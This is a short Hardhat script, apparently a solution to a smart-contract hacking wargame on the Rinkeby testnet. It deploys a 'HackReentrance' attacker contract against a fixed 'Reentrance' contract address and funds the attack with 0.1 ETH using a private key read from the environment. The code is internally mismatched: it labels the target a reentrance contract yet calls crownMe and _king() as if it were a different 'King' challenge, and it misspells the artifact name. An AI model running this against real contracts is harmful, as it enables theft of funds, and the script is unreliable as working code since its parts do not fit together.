require("dotenv").config();

const provider = new hre.ethers.providers.JsonRpcProvider( process.env.RINKEBY_URL );
const wallet = new hre.ethers.Wallet( process.env.PRIVATE_KEY, provider );

const main = async () => {
  const kingAbi = await hre.artifacts.readArtifact("Reentrnace");
  const kingContract = await new hre.ethers.Contract("0x311Dda1bD3289a11dBECA53f0103631a9AcdF24C", kingAbi.abi, wallet);
  console.log("Reentrance contract: " + kingContract.address);

  const hackReentranceFactory = await hre.ethers.getContractFactory("HackReentrance");
  const hackReentranceContract = await hackReentranceFactory.deploy("0x311Dda1bD3289a11dBECA53f0103631a9AcdF24C");
  await hackReentranceContract.deployed();
  console.log(`HackReentrance contract: ${hackReentranceContract.address}`)

  let txn = await hackReentranceContract.crownMe({value: "100000000000000000"});
  console.log("Donating...")
  await txn.wait();
  console.log("Donation complete.");
  console.log(`The current king is ${await kingContract._king()}`)
}

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
};

runMain();
